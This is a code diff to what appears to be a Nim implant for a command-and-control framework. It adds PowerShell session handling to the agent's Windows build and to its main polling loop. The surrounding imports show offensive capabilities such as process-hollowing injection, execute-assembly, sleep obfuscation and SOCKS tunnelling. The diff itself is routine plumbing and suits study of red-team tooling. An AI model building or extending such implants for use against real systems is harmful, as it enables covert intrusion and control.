@@ -41,6 +41,7 @@ import tasks/config as taskConfig
 import tasks/pkill
 
 when defined(windows):
+  import tasks/powershell as powershellTask
   import tasks/link
   import profiles/smb
   import tasks/execute_assembly
@@ -72,6 +73,8 @@ when defined(windows):
   import tasks/inject_hollow
   import tasks/run_pe
   import tasks/powershell_import
+
+when defined(windows):
   when defined(sleepObfuscationEkko):
     import utils/ekko
 
@@ -1241,6 +1244,12 @@ proc runAgent*() =
     let ptyResponses = checkActivePtySessions()
     for response in ptyResponses:
       agentInstance.taskResponses.add(response)
+    
+    # Check active PowerShell sessions for output (non-blocking via threads)
+    when defined(windows):
+      let psResponses = powershellTask.checkActivePsSessions()
+      for response in psResponses:
+        agentInstance.taskResponses.add(response)
     
     # Check active SOCKS connections for data (non-blocking via threads)
     let socksResponses = checkActiveSocksConnections()
